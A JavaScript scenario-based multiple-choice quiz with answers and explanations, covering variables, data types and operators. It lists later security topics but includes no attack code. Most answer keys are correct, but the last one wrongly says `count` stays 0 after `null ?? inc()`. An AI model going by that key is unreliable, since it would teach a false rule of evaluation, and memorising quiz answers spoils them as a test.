# JavaScript Scenario-Based MCQ

> Scenario-based multiple choice questions covering JavaScript topics.

<br>

## Related Topics

* *[HTML Basics](https://github.com/learning-zone/html-basics)*
* *[CSS Basics](https://github.com/learning-zone/css-basics)*
* *[ECMAScript 6 Basics](https://github.com/learning-zone/javascript-es6-basics)*
* *[JavaScript Unit Testing](https://github.com/learning-zone/javascript-unit-testing)*
* *[JavaScript Coding Practice](https://github.com/learning-zone/javascript-coding-practice)*
* *[JavaScript Design Patterns](https://github.com/learning-zone/javascript-design-patterns)*
* *[Data Structure in JavaScript](https://github.com/learning-zone/javascript-data-structure)*

<br>

## Table of Contents

## L1: Fundamental (Entry-Level / Junior)
Focus: Syntax, basic logic, and standard data handling.

* [Variables](#-1-variables): var, let, const.
* [Data Types](#-2-data-types): Primitives vs. Objects.
* [Operators](#-3-operators): Arithmetic, comparison (== vs ===), and logical.
* [Numbers](#-4-numbers) & [String](#-6-string): Basic methods like .toFixed() or .slice().
* [Arrays](#-5-array): Basic manipulation using push(), pop(), and length.
* [Control Flow](#-6-control-flow): Simple if/else and for loops.
* [Functions](#-7-functions): Standard declarations and parameters.  

## L2: Intermediate (Junior-Mid / Developer)
Focus: ES6+ features, DOM, and common "trick" concepts.

* [Scope & Closures](#-8-scope--closures): Understanding block scope and lexical scoping.
* [Hoisting](#-9-hoisting): Variable and function declarations.
* [ES6 Features](#-10-es6-features): Arrow functions, template literals, and destructuring.
* [DOM & Events](#-11-events): Selecting elements, adding listeners, and event bubbling.
* [Regular Expressions](#-12-regular-expression): Basic pattern matching.
* [Error Handling](#-13-error-handling): Using try...catch.
* [Web Storage](#-14-web-storage): localStorage and sessionStorage.  

## L3: Advanced (Mid-Senior / Lead)
Focus: Asynchronous operations, performance, and internal engine mechanics. [4] 

* [Promises](#-15-promises) & [Async/Await](#-16-Async--Await): Handling complex asynchronous flows.
* [Event Loop](#-16-Event-Loop): Understanding the microtask vs. macrotask queue.
* [this Keyword](#-17-this-keyword): Binding with .call(), .apply(), and .bind().
* [Objects & Prototypes](#-18-objects--prototypes): Prototypal inheritance and the prototype chain.
* [Functional Programming](#-19-functional-programming): High-order functions like map, filter, and reduce.
* [Classes](#-20-classes): Inheritance, constructors, and static methods.
* [Modules](#-21-modules): ES Modules (import/export).  

## L4: Expert (Senior / Architect)
Focus: Scalability, security, and low-level optimization.

* [Performance Optimization](#-22-performance-optimization): Memoization, debouncing/throttling, and avoiding memory leaks.
* [Design Patterns](#-23-design-patterns): Singleton, Factory, and Pub-Sub patterns.
* [Security](#-24-security): Preventing XSS, CSRF, and secure data handling.
* [Browser Internals](#-25-browser-performance): Rendering behavior, reflows, and repaints.
* [Progressive Web Apps (PWA)](#-26-progressive-web-apps-pwa): Service workers and caching strategies.
* [Complex Problem Solving](#-27-real-world-problem-solving): Coding simulators for real-world algorithmic tasks.

## L5: Technical Lead
Focus: Code review, team standards, architectural decisions, and engineering best practices for leading a development team.

* [Code Review & Standards](#-28-code-review--standards): Identifying anti-patterns, enforcing conventions, and reviewing PRs.
* [Async Strategy & Team Patterns](#-29-async-strategy--team-patterns): Choosing and enforcing async patterns across a codebase.
* [Module Architecture](#-30-module-architecture): Organizing modules, barrel files, and dependency management.
* [Error Handling Strategy](#-31-error-handling-strategy): Centralized error handling and observability.
* [Performance Review](#-32-performance-review): Reviewing code for layout thrashing, memory leaks, and bundle size.

## L6: Technical Architect
Focus: System-level design, scalability, security posture, micro-frontends, and cross-team JavaScript architecture.

* [Micro-Frontend Architecture](#-33-micro-frontend-architecture): Module federation, iframe isolation, and shared dependencies.
* [Bundle & Runtime Optimization](#-34-bundle--runtime-optimization): Tree-shaking, code-splitting, and Web Workers.
* [Security Architecture](#-35-security-architecture): CSP headers, CORS configuration, and supply chain security.
* [State Management at Scale](#-36-state-management-at-scale): Choosing state patterns for large distributed frontend teams.
* [Migration & Evolution](#-37-migration--evolution): Framework migrations, progressive TypeScript adoption, and API versioning.

<br>

## L1: Fundamental (Entry-Level / Junior)

<br>

## # 1. Variables

<br>

## Q. A developer writes the following code inside a function. What is the output?

```javascript
function test() {
  console.log(x);
  var x = 5;
  console.log(x);
}
test();
```

- A) `ReferenceError: x is not defined`, `5`
- B) `undefined`, `5`
- C) `5`, `5`
- D) `null`, `5`

**Answer: B) `undefined`, `5`**

**Explanation:** `var` declarations are hoisted to the top of their function scope and initialized to `undefined`. So `console.log(x)` before assignment prints `undefined`, and after assignment it prints `5`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A team decides to use `let` instead of `var` for all loop counters. What happens when this code runs?

```javascript
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
```

- A) `3`, `3`, `3`
- B) `0`, `1`, `2`
- C) `undefined`, `undefined`, `undefined`
- D) `ReferenceError`

**Answer: B) `0`, `1`, `2`**

**Explanation:** `let` creates a new binding for each iteration of the loop due to block scoping. Each `setTimeout` callback captures its own `i` value. With `var`, the output would be `3, 3, 3`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer writes a configuration object that should never be reassigned. Which declaration is most appropriate and what happens if you try to modify it?

```javascript
const config = { apiUrl: "https://api.example.com" };
config.apiUrl = "https://new-api.com";
console.log(config.apiUrl);
```

- A) Throws a `TypeError` — `const` prevents all mutations
- B) Logs `"https://new-api.com"` — `const` only prevents reassignment, not mutation
- C) Logs `"https://api.example.com"` — `const` silently ignores the assignment
- D) Throws a `SyntaxError` at declaration

**Answer: B) Logs `"https://new-api.com"` — `const` only prevents reassignment, not mutation**

**Explanation:** `const` prevents rebinding (e.g., `config = {}` would throw), but the object\'s properties can still be changed. To truly freeze an object, use `Object.freeze(config)`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is logged to the console?

```javascript
let a = 1;
let b = a;
b = 2;
console.log(a);
```

- A) `2`
- B) `1`
- C) `undefined`
- D) `null`

**Answer: B) `1`**

**Explanation:** Primitive values like numbers are copied by value. Assigning `b = a` creates an independent copy, so modifying `b` has no effect on `a`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What happens when you access a `let` variable before its declaration inside a block?

```javascript
{
  console.log(typeof myVar);
  console.log(typeof myLet);
  var myVar = 'var';
  let myLet = 'let';
}
```

- A) `"undefined"`, `"undefined"`
- B) `"undefined"`, `ReferenceError`
- C) `"string"`, `"string"`
- D) `"var"`, `"let"`

**Answer: B) `"undefined"`, `ReferenceError`**

**Explanation:** `var` is hoisted and initialized to `undefined`, so `typeof myVar` safely returns `"undefined"`. `let` is hoisted but NOT initialized — it sits in the Temporal Dead Zone. Accessing it before the declaration line throws a `ReferenceError: Cannot access 'myLet' before initialization`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What happens when you attempt to reassign a `const` variable?

```javascript
const PI = 3.14;
try {
  PI = 3.14159;
} catch (e) {
  console.log(e instanceof TypeError);
}
console.log(PI);
```

- A) `false`, `3.14159`
- B) `true`, `3.14`
- C) `false`, `3.14`
- D) `true`, `3.14159`

**Answer: B) `true`, `3.14`**

**Explanation:** Attempting to reassign a `const` binding throws a `TypeError`. The `catch` block confirms `e instanceof TypeError` is `true`. `PI` remains `3.14` because the assignment failed. Remember: `const` prevents rebinding but does not make objects immutable.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the scope of `var` versus `let` in a block?

```javascript
{
  var blockVar = 'I am var';
  let blockLet = 'I am let';
}
console.log(typeof blockVar);
console.log(typeof blockLet);
```

- A) `"string"`, `"string"`
- B) `"undefined"`, `"undefined"`
- C) `"string"`, `"undefined"`
- D) `ReferenceError` on both

**Answer: C) `"string"`, `"undefined"`**

**Explanation:** `var` is function-scoped (or global if not inside a function), so `blockVar` leaks outside the block. `let` is block-scoped — it does not exist outside `{}`. `typeof blockLet` returns `"undefined"` (not a ReferenceError) because `typeof` on an undeclared name is safe.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer chains multiple assignments. What is logged?

```javascript
let x, y, z;
x = y = z = 10;
console.log(x, y, z);
z = 99;
console.log(x, y, z);
```

- A) `10 10 10`, then `99 99 99`
- B) `10 10 10`, then `10 10 99`
- C) `undefined undefined undefined`, then `10 10 99`
- D) `10 10 10`, then `99 10 10`

**Answer: B) `10 10 10`, then `10 10 99`**

**Explanation:** Assignment evaluates right-to-left: `z = 10`, `y = 10`, `x = 10`. All three are independently assigned the value `10`. They are not references to each other. Changing `z` to `99` does not affect `x` or `y`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What happens when a variable is assigned without a declaration keyword inside a function?

```javascript
function createGlobal() {
  implicitGlobal = 'I am global';
}
createGlobal();
console.log(typeof implicitGlobal);
console.log(implicitGlobal);
```

- A) `"undefined"`, `ReferenceError`
- B) `"string"`, `"I am global"`
- C) `ReferenceError` on both
- D) `"string"`, `undefined`

**Answer: B) `"string"`, `"I am global"`**

**Explanation:** Assigning to an undeclared variable in non-strict mode creates an implicit global variable. This is a dangerous anti-pattern and a common source of bugs. In strict mode (`"use strict"`), this throws a `ReferenceError`. Always declare variables with `let`, `const`, or `var`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does variable shadowing produce in nested scopes?

```javascript
const value = 'outer';

function outer() {
  const value = 'middle';
  function inner() {
    const value = 'inner';
    console.log(value);
  }
  inner();
  console.log(value);
}

outer();
console.log(value);
```

- A) `"outer"`, `"outer"`, `"outer"`
- B) `"inner"`, `"middle"`, `"outer"`
- C) `"inner"`, `"inner"`, `"inner"`
- D) `"outer"`, `"middle"`, `"inner"`

**Answer: B) `"inner"`, `"middle"`, `"outer"`**

**Explanation:** Each `const value` creates a new binding that shadows outer ones within its own scope. `inner()` logs its own `"inner"`, the `outer()` function\'s log sees `"middle"`, and the global log sees `"outer"`. Each scope resolves names by walking up the scope chain.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses `var` in a `for` loop with `setTimeout`. What is logged?

```javascript
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0);
}
```

- A) `0`, `1`, `2`
- B) `3`, `3`, `3`
- C) `0`, `0`, `0`
- D) `undefined`, `undefined`, `undefined`

**Answer: B) `3`, `3`, `3`**

**Explanation:** `var` is function-scoped — all three callbacks close over the same `i`. By the time the `setTimeout` callbacks run (after the loop completes), `i` has been incremented to `3`. Replace `var` with `let` to create a new block-scoped binding per iteration (outputs `0, 1, 2`).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. Which of the following identifiers is valid in JavaScript?

```javascript
const $price = 100;    // A
const _temp  = 200;    // B
// const 2fast = 300;  // C
const über   = 400;    // D
```

- A) Only `$price` is valid
- B) `$price`, `_temp`, and `über` are valid; `2fast` is a `SyntaxError`
- C) Only `$price` and `_temp` are valid
- D) Only identifiers using ASCII characters are valid

**Answer: B) `$price`, `_temp`, and `über` are valid; `2fast` is a `SyntaxError`**

**Explanation:** Identifiers must start with a Unicode letter, `_`, or `$`. Digits are not allowed as the first character. JavaScript supports Unicode identifiers, so `über` is valid. `2fast` is a `SyntaxError` because it starts with a digit. Reserved keywords (like `class`, `let`, `return`) also cannot be used as identifiers.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does the `typeof` operator behave on undeclared variables?

```javascript
console.log(typeof undeclaredVariable);
console.log(undeclaredVariable === undefined);
```

- A) `"undefined"`, `true`
- B) `"undefined"`, `ReferenceError`
- C) `ReferenceError`, `ReferenceError`
- D) `null`, `false`

**Answer: B) `"undefined"`, `ReferenceError`**

**Explanation:** `typeof` is the only operator that does NOT throw when used on an undeclared variable — it safely returns `"undefined"`. However, directly referencing an undeclared variable (like `=== undefined`) throws a `ReferenceError`. This makes `typeof` useful for safe feature detection: `if (typeof window !== 'undefined')`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses array destructuring for a variable swap. What is the output?

```javascript
let a = 1, b = 2;
[a, b] = [b, a];
console.log(a, b);
```

- A) `1 2`
- B) `2 1`
- C) `undefined undefined`
- D) `SyntaxError`

**Answer: B) `2 1`**

**Explanation:** ES6 array destructuring enables an elegant variable swap without a temporary variable. The right side `[b, a]` creates a new array `[2, 1]`, which is then destructured back into `a` and `b`. This is equivalent to the classic `let temp = a; a = b; b = temp`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 2. Data Types

<br>

## Q. A developer checks data types using `typeof`. What does the following code output?

```javascript
console.log(typeof null);
console.log(typeof undefined);
console.log(typeof NaN);
console.log(typeof function(){});
```

- A) `"null"`, `"undefined"`, `"NaN"`, `"function"`
- B) `"object"`, `"undefined"`, `"number"`, `"function"`
- C) `"null"`, `"undefined"`, `"number"`, `"object"`
- D) `"object"`, `"null"`, `"number"`, `"function"`

**Answer: B) `"object"`, `"undefined"`, `"number"`, `"function"`**

**Explanation:** `typeof null === "object"` is a well-known JavaScript bug. `NaN` is of type `"number"`. `undefined` correctly returns `"undefined"`, and functions return `"function"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. Two variables hold values. What does the equality check return?

```javascript
let arr1 = [1, 2, 3];
let arr2 = [1, 2, 3];
console.log(arr1 === arr2);
```

- A) `true` — the arrays contain the same values
- B) `false` — arrays are compared by reference, not value
- C) `undefined`
- D) Throws a `TypeError`

**Answer: B) `false` — arrays are compared by reference, not value**

**Explanation:** Arrays and objects are reference types. `arr1` and `arr2` are two separate objects in memory. Even though their contents are equal, `===` compares memory references, not values.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output?

```javascript
console.log(0 == false);
console.log(0 === false);
console.log("" == false);
console.log("" === false);
```

- A) `true`, `true`, `true`, `true`
- B) `true`, `false`, `true`, `false`
- C) `false`, `false`, `true`, `true`
- D) `true`, `true`, `false`, `false`

**Answer: B) `true`, `false`, `true`, `false`**

**Explanation:** `==` performs type coercion: `0 == false` and `"" == false` coerce to the same numeric value (`0`). `===` checks both value and type with no coercion, so `0 === false` and `"" === false` are both `false`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses `Symbol` as an object key. What is the output?

```javascript
const id = Symbol('id');
const user = {
  name: 'Alice',
  [id]: 12345
};
console.log(user[id]);
console.log(Object.keys(user));
console.log(JSON.stringify(user));
```

- A) `12345`, `["name", "id"]`, `'{"name":"Alice","id":12345}'`
- B) `12345`, `["name"]`, `'{"name":"Alice"}'`
- C) `undefined`, `["name"]`, `'{"name":"Alice"}'`
- D) `12345`, `["name"]`, `'{"name":"Alice","Symbol(id)":12345}'`

**Answer: B) `12345`, `["name"]`, `'{"name":"Alice"}'`**

**Explanation:** Symbol-keyed properties are not enumerable via `Object.keys()`, `for...in`, or serialized by `JSON.stringify()`. They are hidden from most reflection APIs. Use `Object.getOwnPropertySymbols(obj)` to retrieve them. This makes Symbols useful for adding non-colliding metadata to objects.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `typeof null` return and why is it misleading?

```javascript
console.log(typeof null === 'object');
console.log(null instanceof Object);
console.log(null == undefined);
console.log(null === undefined);
```

- A) `true`, `true`, `true`, `true`
- B) `true`, `false`, `true`, `false`
- C) `false`, `false`, `true`, `false`
- D) `true`, `false`, `false`, `false`

**Answer: B) `true`, `false`, `true`, `false`**

**Explanation:** `typeof null === "object"` is a well-known JavaScript historical bug. However, `null instanceof Object` is `false` because `instanceof` checks the prototype chain and `null` has none. `null == undefined` is `true` by spec (they are equal with `==`); `null === undefined` is `false` due to different types.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does explicit `Boolean()` conversion produce for these values?

```javascript
console.log(Boolean(0));
console.log(Boolean(''));
console.log(Boolean([]));
console.log(Boolean({}));
console.log(Boolean('false'));
```

- A) `false`, `false`, `false`, `false`, `false`
- B) `false`, `false`, `true`, `true`, `true`
- C) `false`, `false`, `false`, `true`, `true`
- D) `false`, `false`, `true`, `false`, `false`

**Answer: B) `false`, `false`, `true`, `true`, `true`**

**Explanation:** `0` and `''` are falsy. Empty arrays `[]` and empty objects `{}` are **truthy** — they are object references, and all non-null objects are truthy. `'false'` is a non-empty string and therefore truthy. This catches many developers off guard when checking for empty collections.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses `Number()` for explicit conversions. What is the output?

```javascript
console.log(Number(true));
console.log(Number(false));
console.log(Number(null));
console.log(Number(undefined));
console.log(Number('  42  '));
```

- A) `1`, `0`, `0`, `0`, `42`
- B) `1`, `0`, `0`, `NaN`, `42`
- C) `1`, `0`, `null`, `NaN`, `NaN`
- D) `1`, `0`, `0`, `NaN`, `NaN`

**Answer: B) `1`, `0`, `0`, `NaN`, `42`**

**Explanation:** `Number(true)` → `1`, `Number(false)` → `0`. `Number(null)` → `0`. `Number(undefined)` → `NaN`. `Number('  42  ')` → `42` — `Number()` trims whitespace before parsing. Knowing these rules prevents bugs when doing arithmetic with mixed-type data.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of these string-to-number conversion methods?

```javascript
console.log(String(null));
console.log(String(undefined));
console.log(String(true));
console.log((1234).toString(16));
console.log((255).toString(2));
```

- A) `"null"`, `"undefined"`, `"true"`, `"4d2"`, `"11111111"`
- B) `null`, `undefined`, `true`, `"4d2"`, `"11111111"`
- C) `""`, `""`, `"1"`, `"4d2"`, `"11111111"`
- D) `"null"`, `"undefined"`, `"true"`, `"4d2"`, `"ff"`

**Answer: A) `"null"`, `"undefined"`, `"true"`, `"4d2"`, `"11111111"`**

**Explanation:** `String()` converts `null` and `undefined` to their literal string representations. `.toString(16)` converts `1234` to hexadecimal `"4d2"`. `.toString(2)` converts `255` to binary `"11111111"`. The radix argument allows base conversion from 2 to 36.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Object.is()` return compared to `===` for these edge cases?

```javascript
console.log(Object.is(NaN, NaN));
console.log(Object.is(+0, -0));
console.log(Object.is(null, null));
console.log(Object.is(undefined, undefined));
```

- A) `false`, `true`, `true`, `true`
- B) `true`, `false`, `true`, `true`
- C) `false`, `false`, `true`, `true`
- D) `true`, `true`, `true`, `true`

**Answer: B) `true`, `false`, `true`, `true`**

**Explanation:** `Object.is()` uses the SameValue algorithm. Unlike `===`, it treats `NaN` as equal to itself (`true`) and distinguishes `+0` from `-0` (`false`). `null` is identical to `null`, and `undefined` is identical to `undefined`. Use `Object.is()` when you need precise equality handling.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer checks if a value is a plain object. What does this function output?

```javascript
function isPlainObject(value) {
  return typeof value === 'object'
    && value !== null
    && !Array.isArray(value);
}
console.log(isPlainObject({}));
console.log(isPlainObject([]));
console.log(isPlainObject(null));
console.log(isPlainObject(new Date()));
```

- A) `true`, `false`, `false`, `false`
- B) `true`, `false`, `false`, `true`
- C) `true`, `true`, `false`, `true`
- D) `false`, `false`, `false`, `false`

**Answer: B) `true`, `false`, `false`, `true`**

**Explanation:** The function correctly excludes `null` and arrays, but `new Date()` also passes — it is a non-null, non-array object. For stricter plain-object detection, also check `Object.getPrototypeOf(value) === Object.prototype`. This catches class instances and built-ins.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the result of these loose equality comparisons?

```javascript
console.log('' == false);
console.log(0 == '');
console.log(0 == '0');
console.log('' == '0');
```

- A) `true`, `true`, `true`, `true`
- B) `true`, `true`, `true`, `false`
- C) `false`, `true`, `true`, `false`
- D) `true`, `false`, `true`, `false`

**Answer: B) `true`, `true`, `true`, `false`**

**Explanation:** `'' == false` → both coerce to `0`, so `true`. `0 == ''` → `''` coerces to `0`, so `true`. `0 == '0'` → `'0'` coerces to `0`, so `true`. `'' == '0'` → string comparison, `""` ≠ `"0"`, so `false`. This non-transitivity illustrates why `===` is always preferred.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses `parseInt` and `parseFloat`. What is the output?

```javascript
console.log(parseInt('10.9'));
console.log(parseFloat('10.9'));
console.log(parseInt('0xFF', 16));
console.log(parseInt('010'));
console.log(parseInt('10abc'));
```

- A) `10`, `10.9`, `255`, `8`, `10`
- B) `10`, `10.9`, `255`, `10`, `10`
- C) `10`, `10.9`, `255`, `8`, `NaN`
- D) `10`, `10`, `255`, `10`, `NaN`

**Answer: B) `10`, `10.9`, `255`, `10`, `10`**

**Explanation:** `parseInt('10.9')` → `10` (truncates decimal). `parseFloat('10.9')` → `10.9`. `parseInt('0xFF', 16)` → `255`. `parseInt('010')` → `10` (ES5+ defaults to base 10 without explicit radix). `parseInt('10abc')` → `10` (parses until invalid character).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of mapping an array of mixed values through `typeof`?

```javascript
const data = [1, 'two', true, null, undefined, {}, []];
const types = data.map(item => typeof item);
console.log(types);
```

- A) `["number","string","boolean","null","undefined","object","array"]`
- B) `["number","string","boolean","object","undefined","object","object"]`
- C) `["number","string","boolean","null","undefined","object","object"]`
- D) `["number","string","boolean","object","object","object","object"]`

**Answer: B) `["number","string","boolean","object","undefined","object","object"]`**

**Explanation:** `typeof null` is `"object"` (historical bug). `typeof undefined` is `"undefined"`. `typeof {}` and `typeof []` both return `"object"`. There is no `"null"` or `"array"` typeof result. Use `Array.isArray()` to distinguish arrays and `=== null` to detect null values.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 3. Operators

<br>

## Q. A developer uses the nullish coalescing operator. What is printed?

```javascript
let userInput = 0;
let result1 = userInput || "default";
let result2 = userInput ?? "default";
console.log(result1);
console.log(result2);
```

- A) `"default"`, `"default"`
- B) `0`, `0`
- C) `"default"`, `0`
- D) `0`, `"default"`

**Answer: C) `"default"`, `0`**

**Explanation:** `||` returns the right side for any falsy value (including `0`, `""`, `false`). `??` (nullish coalescing) only returns the right side when the left is `null` or `undefined`. Since `0` is not `null`/`undefined`, `??` returns `0`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the result of the following expressions?

```javascript
console.log(5 + "3");
console.log(5 - "3");
console.log(true + true);
console.log(true + false);
```

- A) `"53"`, `2`, `2`, `1`
- B) `8`, `2`, `2`, `1`
- C) `"53"`, `"53"`, `2`, `1`
- D) `8`, `"53"`, `2`, `0`

**Answer: A) `"53"`, `2`, `2`, `1`**

**Explanation:** `+` with a string triggers concatenation: `5 + "3" = "53"`. `-` does not concatenate — it coerces `"3"` to a number: `5 - 3 = 2`. Booleans coerce to `0` or `1` in arithmetic: `true + true = 2`, `true + false = 1`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the short-circuit evaluation return?

```javascript
let a = null;
let b = a && a.name;
let c = a || "Anonymous";
console.log(b);
console.log(c);
```

- A) `TypeError`, `"Anonymous"`
- B) `null`, `"Anonymous"`
- C) `undefined`, `null`
- D) `null`, `null`

**Answer: B) `null`, `"Anonymous"`**

**Explanation:** `&&` short-circuits at the first falsy value (`null`), so `b = null` without evaluating `a.name`. `||` short-circuits at the first truthy value; since `a` is `null` (falsy), it evaluates to `"Anonymous"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the optional chaining operator return when properties are missing?

```javascript
const config = {
  database: { host: 'localhost' }
};
console.log(config?.database?.host);
console.log(config?.cache?.host);
console.log(config?.cache?.host ?? 'default-host');
```

- A) `"localhost"`, `null`, `"default-host"`
- B) `"localhost"`, `undefined`, `"default-host"`
- C) `"localhost"`, `TypeError`, `"default-host"`
- D) `"localhost"`, `undefined`, `undefined`

**Answer: B) `"localhost"`, `undefined`, `"default-host"`**

**Explanation:** `?.` returns `undefined` (rather than throwing) when a property access would fail due to `null` or `undefined`. `config?.cache` is `undefined`, so `?.host` is also `undefined`. The `??` operator returns `"default-host"` since `undefined` is nullish.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the logical AND assignment operator `&&=` do?

```javascript
let a = 1;
let b = 0;
let c = null;
a &&= 99;
b &&= 99;
c &&= 99;
console.log(a, b, c);
```

- A) `99`, `99`, `99`
- B) `99`, `0`, `null`
- C) `1`, `0`, `null`
- D) `99`, `0`, `99`

**Answer: B) `99`, `0`, `null`**

**Explanation:** `&&=` only assigns the right side if the left side is **truthy**. `a = 1` (truthy) → assigned `99`. `b = 0` (falsy) → not assigned, stays `0`. `c = null` (falsy) → not assigned, stays `null`. This is shorthand for `a = a && 99`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the result of these bitwise operations?

```javascript
console.log(5 & 3);
console.log(5 | 3);
console.log(5 ^ 3);
console.log(~5);
console.log(5 << 1);
console.log(20 >> 2);
```

- A) `1`, `7`, `6`, `-6`, `10`, `5`
- B) `1`, `7`, `6`, `-5`, `10`, `5`
- C) `0`, `7`, `6`, `-6`, `10`, `5`
- D) `1`, `7`, `6`, `-6`, `20`, `5`

**Answer: A) `1`, `7`, `6`, `-6`, `10`, `5`**

**Explanation:** `5 & 3`: `101 & 011 = 001 = 1`. `5 | 3`: `101 | 011 = 111 = 7`. `5 ^ 3`: `101 ^ 011 = 110 = 6`. `~5`: bitwise NOT (two\'s complement) = `-(5+1) = -6`. `5 << 1` = `10`. `20 >> 2` = `5`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `instanceof` operator check?

```javascript
class Animal {}
class Dog extends Animal {}
const dog = new Dog();
console.log(dog instanceof Dog);
console.log(dog instanceof Animal);
console.log(dog instanceof Object);
console.log([] instanceof Array);
```

- A) `true`, `false`, `false`, `true`
- B) `true`, `true`, `true`, `true`
- C) `true`, `true`, `false`, `true`
- D) `false`, `false`, `true`, `true`

**Answer: B) `true`, `true`, `true`, `true`**

**Explanation:** `instanceof` walks the prototype chain. `dog` is an instance of `Dog`, `Animal` (through inheritance), and `Object` (all objects ultimately inherit from `Object.prototype`). `[]` is an instance of `Array`. Every object is an instance of `Object`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the ternary operator return in this chained grading example?

```javascript
function classify(score) {
  return score >= 90 ? 'A'
       : score >= 80 ? 'B'
       : score >= 70 ? 'C'
       : score >= 60 ? 'D'
       : 'F';
}
console.log(classify(85));
console.log(classify(55));
```

- A) `'A'`, `'F'`
- B) `'B'`, `'D'`
- C) `'B'`, `'F'`
- D) `'A'`, `'D'`

**Answer: C) `'B'`, `'F'`**

**Explanation:** Chained ternaries act like if/else if chains. `85 >= 90` is false, `85 >= 80` is true → `'B'`. For `55`: all conditions fail → `'F'`. This pattern is readable for simple grading/classification but should be avoided for complex multi-branch logic.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `delete` operator do to an object property?

```javascript
const obj = { a: 1, b: 2, c: 3 };
console.log(delete obj.b);
console.log(obj);
console.log(delete obj.nonExistent);
```

- A) `false`, `{ a:1, c:3 }`, `false`
- B) `true`, `{ a:1, c:3 }`, `true`
- C) `true`, `{ a:1, b:undefined, c:3 }`, `true`
- D) `undefined`, `{ a:1, c:3 }`, `undefined`

**Answer: B) `true`, `{ a:1, c:3 }`, `true`**

**Explanation:** `delete` removes a property from an object and returns `true` on success. It also returns `true` when the property doesn\'t exist. It completely removes the property (does not set it to `undefined`). `delete` on `var`/`let`/`const` variables returns `false` (those cannot be deleted).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of the `void` operator?

```javascript
console.log(void 0);
console.log(void 'anything');
console.log(void (2 + 2));
console.log(typeof void 0);
```

- A) `0`, `"anything"`, `4`, `"number"`
- B) `undefined`, `undefined`, `undefined`, `"undefined"`
- C) `null`, `null`, `null`, `"object"`
- D) `0`, `null`, `undefined`, `"undefined"`

**Answer: B) `undefined`, `undefined`, `undefined`, `"undefined"`**

**Explanation:** The `void` operator evaluates its operand expression and always returns `undefined`. `void 0` is a common idiom for getting `undefined` reliably (in older environments where `undefined` could be overwritten). `typeof void 0` returns `"undefined"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output given operator precedence and associativity?

```javascript
console.log(2 + 3 * 4);
console.log((2 + 3) * 4);
console.log(2 ** 3 ** 2);
console.log(true + true * 2);
```

- A) `14`, `20`, `512`, `3`
- B) `20`, `20`, `64`, `4`
- C) `14`, `20`, `64`, `3`
- D) `14`, `20`, `512`, `4`

**Answer: A) `14`, `20`, `512`, `3`**

**Explanation:** Multiplication before addition: `2 + (3*4) = 14`. With parentheses: `(2+3)*4 = 20`. `**` is **right-associative**: `2 ** (3 ** 2) = 2 ** 9 = 512`, NOT `8 ** 2 = 64`. `true*2 = 2`, `true + 2 = 3`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does short-circuit evaluation return in this side-effect example?

```javascript
let count = 0;
const inc = () => ++count;
const a = false && inc();
const b = true || inc();
const c = null ?? inc();
console.log(count, a, b, c);
```

- A) `1`, `false`, `true`, `1`
- B) `0`, `false`, `true`, `1`
- C) `1`, `false`, `true`, `null`
- D) `2`, `false`, `true`, `2`

**Answer: B) `0`, `false`, `true`, `1`**

